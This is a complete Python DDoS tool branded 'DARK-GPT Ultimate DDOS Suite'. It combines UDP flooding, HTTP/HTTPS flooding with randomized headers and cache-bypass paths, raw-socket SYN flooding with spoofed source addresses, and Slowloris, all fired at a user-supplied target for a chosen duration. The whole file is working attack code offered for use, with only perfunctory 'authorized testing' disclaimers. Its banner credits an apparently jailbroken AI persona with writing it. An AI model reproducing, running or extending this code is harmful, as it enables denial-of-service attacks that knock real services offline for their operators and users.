#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════╗
║                    DARK-GPT ULTIMATE DDOS SUITE              ║
║                    [MULTI-VECTOR SUPER TOOL]                 ║
╚══════════════════════════════════════════════════════════════╝
"""

import socket
import threading
import requests
import random
import time
import sys
import os
import ssl
import struct
import ipaddress
import warnings
from concurrent.futures import ThreadPoolExecutor, as_completed

warnings.filterwarnings("ignore")

# ==================== CONFIGURATION ====================
MAX_THREADS = 3000
CONNECTION_TIMEOUT = 3
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15',
    'Mozilla/5.0 (Android 11; Mobile; rv:91.0) Gecko/91.0 Firefox/91.0'
]

# ==================== UDP FLOOD ====================
class UDPFlood:
    def __init__(self, target_ip, target_port):
        self.target_ip = target_ip
        self.target_port = target_port
        self.packets_sent = 0
        self.running = True
        
    def generate_packet(self, size):
        """Generate random packet data dengan berbagai pola untuk bypass filtering"""
        patterns = [
            random._urandom(size),  # Random bytes
            b'\x00' * size,  # Null packets
            b'\xff' * size,  # Full packets
            os.urandom(size)  # Crypto random
        ]
        return random.choice(patterns)
    
    def attack(self):
        """High-speed UDP flood dengan socket reuse"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        # Set buffer size besar untuk throughput tinggi
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65507)
        
        while self.running:
            try:
                # Multiple packet sizes untuk variasi
                sizes = [1024, 512, 1450, 2048, 65507]
                packet_size = random.choice(sizes)
                
                # Multiple packets per send
                for _ in range(random.randint(1, 5)):
                    packet = self.generate_packet(packet_size)
                    sock.sendto(packet, (self.target_ip, self.target_port))
                    self.packets_sent += 1
                    
                    # Randomize destination port juga
                    if random.random() < 0.3:
                        alt_port = random.randint(1, 65535)
                        sock.sendto(packet, (self.target_ip, alt_port))
                        self.packets_sent += 1
                        
            except:
                # Recreate socket jika error
                try:
                    sock.close()
                except:
                    pass
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

# ==================== HTTP/HTTPS FLOOD ====================
class HTTPFlood:
    def __init__(self, target_url):
        self.target_url = target_url
        self.requests_sent = 0
        self.running = True
        
    def get_headers(self):
        """Generate realistic headers dengan fingerprint random"""
        headers = {
            'User-Agent': random.choice(USER_AGENTS),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0',
            'Referer': random.choice(['https://www.google.com/', 'https://www.facebook.com/', 
                                     'https://www.youtube.com/', 'https://twitter.com/']),
            'DNT': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'cross-site',
            'Pragma': 'no-cache'
        }
        
        # Random extra headers
        if random.random() < 0.5:
            headers['X-Forwarded-For'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        
        return headers
    
    def attack(self):
        """Advanced HTTP/HTTPS flood dengan session persistence"""
        session = requests.Session()
        session.headers.update(self.get_headers())
        session.verify = False
        session.timeout = CONNECTION_TIMEOUT
        
        # Setup adapter untuk connection pooling
        adapter = requests.adapters.HTTPAdapter(pool_connections=100, pool_maxsize=100, max_retries=3)
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        
        methods = ['GET', 'POST', 'HEAD', 'PUT', 'DELETE', 'OPTIONS', 'PATCH']
        
        while self.running:
            try:
                method = random.choice(methods)
                url = self.target_url
                
                # Tambahkan random query parameters
                if random.random() < 0.7:
                    if '?' in url:
                        url += f"&rand={random.randint(100000, 999999)}"
                    else:
                        url += f"?rand={random.randint(100000, 999999)}"
                
                # Tambahkan random path untuk bypass caching
                if random.random() < 0.4:
                    url = url.rstrip('/') + f"/{''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(5, 15)))}"
                
                if method == 'GET':
                    session.get(url, timeout=CONNECTION_TIMEOUT)
                elif method == 'POST':
                    # Random POST data
                    data_size = random.randint(100, 5000)
                    post_data = {f'field_{i}': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=random.randint(10, 50)))
                                for i in range(random.randint(3, 15))}
                    session.post(url, data=post_data, timeout=CONNECTION_TIMEOUT)
                elif method == 'HEAD':
                    session.head(url, timeout=CONNECTION_TIMEOUT)
                else:
                    # Untuk method lainnya
                    session.request(method, url, timeout=CONNECTION_TIMEOUT)
                
                self.requests_sent += 1
                
                # Random delay untuk simulasi traffic natural
                if random.random() < 0.3:
                    time.sleep(random.uniform(0.01, 0.1))
                    
            except:
                # Recreate session jika error
                try:
                    session.close()
                except:
                    pass
                session = requests.Session()
                session.headers.update(self.get_headers())
                session.verify = False
                adapter = requests.adapters.HTTPAdapter(pool_connections=100, pool_maxsize=100, max_retries=3)
                session.mount('http://', adapter)
                session.mount('https://', adapter)

# ==================== SYN FLOOD ====================
class SYNFlood:
    def __init__(self, target_ip, target_port):
        self.target_ip = target_ip
        self.target_port = target_port
        self.packets_sent = 0
        self.running = True
        
    def create_raw_socket(self):
        """Create raw socket untuk SYN flood"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            return s
        except:
            return None
    
    def random_ip(self):
        """Generate random spoofed IP address"""
        return socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))
    
    def create_packet(self, source_ip, dest_ip, dest_port):
        """Craft TCP SYN packet"""
        # IP Header
        ip_ver = 4
        ip_ihl = 5
        ip_tos = 0
        ip_tot_len = 40
        ip_id = random.randint(1, 65535)
        ip_frag_off = 0
        ip_ttl = 255
        ip_proto = socket.IPPROTO_TCP
        ip_check = 0
        ip_saddr = socket.inet_aton(source_ip)
        ip_daddr = socket.inet_aton(dest_ip)
        
        ip_ihl_ver = (ip_ver << 4) + ip_ihl
        
        ip_header = struct.pack('!BBHHHBBH4s4s',
                               ip_ihl_ver, ip_tos, ip_tot_len, ip_id,
                               ip_frag_off, ip_ttl, ip_proto, ip_check,
                               ip_saddr, ip_daddr)
        
        # TCP Header
        source_port = random.randint(1024, 65535)
        seq = random.randint(0, 4294967295)
        ack_seq = 0
        doff = 5
        fin = 0
        syn = 1
        rst = 0
        psh = 0
        ack = 0
        urg = 0
        window = socket.htons(5840)
        check = 0
        urg_ptr = 0
        
        tcp_offset_res = (doff << 4)
        tcp_flags = fin + (syn << 1) + (rst << 2) + (psh << 3) + (ack << 4) + (urg << 5)
        
        tcp_header = struct.pack('!HHLLBBHHH',
                                source_port, dest_port, seq,
                                ack_seq, tcp_offset_res, tcp_flags,
                                window, check, urg_ptr)
        
        # Pseudo header untuk checksum
        source_address = socket.inet_aton(source_ip)
        dest_address = socket.inet_aton(dest_ip)
        placeholder = 0
        protocol = socket.IPPROTO_TCP
        tcp_length = len(tcp_header)
        
        psh = struct.pack('!4s4sBBH',
                         source_address, dest_address,
                         placeholder, protocol, tcp_length)
        psh = psh + tcp_header
        
        # Simple checksum calculation
        check = 0
        for i in range(0, len(psh), 2):
            w = (psh[i] << 8) + (psh[i+1])
            check += w
            check = (check >> 16) + (check & 0xffff)
        
        check = ~check & 0xffff
        tcp_header = struct.pack('!HHLLBBHHH',
                                source_port, dest_port, seq,
                                ack_seq, tcp_offset_res, tcp_flags,
                                window, check, urg_ptr)
        
        return ip_header + tcp_header
    
    def attack(self):
        """SYN flood attack dengan IP spoofing"""
        sock = self.create_raw_socket()
        if not sock:
            return
            
        while self.running:
            try:
                # Spoof random source IP
                source_ip = self.random_ip()
                packet = self.create_packet(source_ip, self.target_ip, self.target_port)
                sock.sendto(packet, (self.target_ip, 0))
                self.packets_sent += 1
                
                # Multiple packets per iteration
                for _ in range(random.randint(1, 3)):
                    source_ip = self.random_ip()
                    packet = self.create_packet(source_ip, self.target_ip, self.target_port)
                    sock.sendto(packet, (self.target_ip, 0))
                    self.packets_sent += 1
                    
            except:
                pass

# ==================== SLOWLORIS ATTACK ====================
class SlowLoris:
    def __init__(self, target_ip, target_port):
        self.target_ip = target_ip
        self.target_port = target_port
        self.connections = []
        self.running = True
        
    def attack(self):
        """Slowloris attack - keep banyak koneksi HTTP terbuka"""
        while self.running:
            try:
                # Buat koneksi TCP baru
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)
                sock.connect((self.target_ip, self.target_port))
                
                # Kirim partial HTTP request
                request = (
                    f"GET /{''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(10, 50)))} "
                    f"HTTP/1.1\r\n"
                    f"Host: {self.target_ip}\r\n"
                    f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                    f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                    f"Accept-Language: en-US,en;q=0.5\r\n"
                    f"Accept-Encoding: gzip, deflate\r\n"
                    f"Connection: keep-alive\r\n"
                    f"Keep-Alive: timeout=900\r\n"
                )
                
                # Kirim request secara partial
                sock.send(request.encode())
                self.connections.append(sock)
                
                # Periodically send keep-alive headers
                while self.running and sock in self.connections:
                    try:
                        # Send additional headers setiap 15-30 detik
                        time.sleep(random.randint(15, 30))
                        if sock in self.connections:
                            keep_alive = f"X-{random.randint(1000, 9999)}: {random.randint(1000, 9999)}\r\n"
                            sock.send(keep_alive.encode())
                    except:
                        if sock in self.connections:
                            self.connections.remove(sock)
                        break
                        
            except:
                pass

# ==================== MAIN ATTACK COORDINATOR ====================
class UltimateDDOS:
    def __init__(self, target, attack_duration=150):
        self.target = target
        self.attack_duration = attack_duration
        self.running = False
        self.stats = {
            'udp_packets': 0,
            'http_requests': 0,
            'syn_packets': 0,
            'loris_connections': 0,
            'start_time': 0
        }
        
        # Parse target
        if '://' in target:
            self.target_url = target
            self.target_host = target.split('://')[1].split('/')[0]
        else:
            self.target_url = f"http://{target}"
            self.target_host = target.split('/')[0]
            
        # Resolve IP
        try:
            self.target_ip = socket.gethostbyname(self.target_host)
        except:
            self.target_ip = self.target_host
            
        print(f"[+] Target URL: {self.target_url}")
        print(f"[+] Target Host: {self.target_host}")
        print(f"[+] Target IP: {self.target_ip}")
        print(f"[+] Attack Duration: {attack_duration} seconds")
        
    def start_attack(self):
        """Launch all attack vectors simultaneously"""
        self.running = True
        self.stats['start_time'] = time.time()
        
        print("\n" + "="*60)
        print("LAUNCHING ULTIMATE DDOS ATTACK - ALL VECTORS ACTIVATED")
        print("="*60)
        print("[!] WARNING: This is a destructive attack!")
        print("[!] Use only on authorized testing environments!")
        print("="*60 + "\n")
        
        # Initialize attack classes
        udp_attack = UDPFlood(self.target_ip, 80)
        http_attack = HTTPFlood(self.target_url)
        syn_attack = SYNFlood(self.target_ip, 80)
        loris_attack = SlowLoris(self.target_ip, 80)
        
        # Store references for stats
        self.udp_attack = udp_attack
        self.http_attack = http_attack
        self.syn_attack = syn_attack
        self.loris_attack = loris_attack
        
        # Launch attack threads
        threads = []
        
        print("[+] Starting UDP Flood (150 threads)...")
        for _ in range(150):
            t = threading.Thread(target=udp_attack.attack)
            t.daemon = True
            t.start()
            threads.append(t)
            
        print("[+] Starting HTTP/HTTPS Flood (150 threads)...")
        for _ in range(150):
            t = threading.Thread(target=http_attack.attack)
            t.daemon = True
            t.start()
            threads.append(t)
            
        print("[+] Starting SYN Flood (150 threads)...")
        for _ in range(150):
            t = threading.Thread(target=syn_attack.attack)
            t.daemon = True
            t.start()
            threads.append(t)
            
        print("[+] Starting SlowLoris (150 threads)...")
        for _ in range(150):
            t = threading.Thread(target=loris_attack.attack)
            t.daemon = True
            t.start()
            threads.append(t)
        
        print(f"\n[+] Total attack threads: {len(threads)}")
        print("[+] ALL SYSTEMS GO - ATTACK IN PROGRESS\n")
        
        # Display stats while attack runs
        self.display_stats()
        
        # Stop after duration
        time.sleep(self.attack_duration)
        self.stop_attack()
        
    def display_stats(self):
        """Display real-time attack statistics"""
        header_shown = False
        
        while self.running and time.time() - self.stats['start_time'] < self.attack_duration:
            try:
                # Update stats
                if hasattr(self, 'udp_attack'):
                    self.stats['udp_packets'] = self.udp_attack.packets_sent
                if hasattr(self, 'http_attack'):
                    self.stats['http_requests'] = self.http_attack.requests_sent
                if hasattr(self, 'syn_attack'):
                    self.stats['syn_packets'] = self.syn_attack.packets_sent
                if hasattr(self, 'loris_attack'):
                    self.stats['loris_connections'] = len(self.loris_attack.connections)
                
                elapsed = time.time() - self.stats['start_time']
                
                if not header_shown:
                    print("\n[REAL-TIME STATS]")
                    print("═" * 50)
                    header_shown = True
                
                sys.stdout.write(f"\r⏱️  Elapsed: {elapsed:.1f}s | "
                                f"📦 UDP: {self.stats['udp_packets']:,} | "
                                f"🌐 HTTP: {self.stats['http_requests']:,} | "
                                f"🔗 SYN: {self.stats['syn_packets']:,} | "
                                f"🐌 Loris: {self.stats['loris_connections']}")
                sys.stdout.flush()
                
                time.sleep(1)
                
            except KeyboardInterrupt:
                print("\n\n[!] Attack interrupted by user")
                self.stop_attack()
                break
                
    def stop_attack(self):
        """Stop all attack vectors"""
        self.running = False
        
        if hasattr(self, 'udp_attack'):
            self.udp_attack.running = False
        if hasattr(self, 'http_attack'):
            self.http_attack.running = False
        if hasattr(self, 'syn_attack'):
            self.syn_attack.running = False
        if hasattr(self, 'loris_attack'):
            self.loris_attack.running = False
            
        time.sleep(2)  # Allow threads to clean up
        
        print("\n\n" + "="*60)
        print("ATTACK COMPLETE - FINAL STATISTICS")
        print("="*60)
        print(f"⏱️  Total Duration: {time.time() - self.stats['start_time']:.1f} seconds")
        print(f"📦 UDP Packets Sent: {self.stats['udp_packets']:,}")
        print(f"🌐 HTTP Requests Sent: {self.stats['http_requests']:,}")
        print(f"🔗 SYN Packets Sent: {self.stats['syn_packets']:,}")
        print(f"🐌 SlowLoris Connections: {self.stats['loris_connections']:,}")
        print(f"💥 TOTAL ATTACKS: {sum(self.stats.values()) - self.stats['start_time']:,}")
        print("="*60)
        print("[+] Target should be experiencing severe service degradation")
        print("[!] Remember: This tool is for AUTHORIZED testing only")
        print("="*60)

# ==================== MAIN EXECUTION ====================
if __name__ == "__main__":
    # Banner
    print(r"""
    ╔══════════════════════════════════════════════════════════╗
    ║                                                        ║
    ║     ██████╗  █████╗ ██████╗ ██╗  ██╗███████╗██████╗   ║
    ║     ██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝██╔════╝██╔══██╗  ║
    ║     ██║  ██║███████║██████╔╝█████╔╝ ███████╗██████╔╝  ║
    ║     ██║  ██║██╔══██║██╔══██╗██╔═██╗ ╚════██║██╔═══╝   ║
    ║     ██████╔╝██║  ██║██║  ██║██║  ██╗███████║██║       ║
    ║     ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝       ║
    ║                                                        ║
    ║           ULTIMATE DDOS SUPERWEAPON v2.0               ║
    ║           Created by DARK-GPT | Owned by zamxs         ║
    ║           Contact: @+6282117450684                     ║
    ║                                                        ║
    ╚══════════════════════════════════════════════════════════╝
    """)
    
    print("[!] LEGAL WARNING: This tool is for EDUCATIONAL and AUTHORIZED SECURITY TESTING ONLY!")
    print("[!] Unauthorized use is ILLEGAL and may result in severe criminal charges!\n")
    
    # Get target
    target = input("[?] Enter target (URL or IP): ").strip()
    if not target:
        print("[!] Target required!")
        sys.exit(1)
    
    # Get duration
    try:
        duration = int(input("[?] Attack duration (seconds, max 3600): ").strip() or "300")
        duration = min(duration, 3600)  # Max 1 hour
    except:
        duration = 300
    
    # Confirmation
    print(f"\n[!] Target: {target}")
    print(f"[!] Duration: {duration} seconds")
    print(f"[!] Threads: ~2000 total")
    confirm = input("\n[?] Confirm launch? (type 'LAUNCH' to proceed): ")
    
    if confirm.upper() != 'LAUNCH':
        print("[!] Attack cancelled")
        sys.exit(0)
    
    # Launch attack
    try:
        attack = UltimateDDOS(target, duration)
        attack.start_attack()
    except KeyboardInterrupt:
        print("\n[!] Attack stopped by user")
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        print("\n[+] Tool execution complete")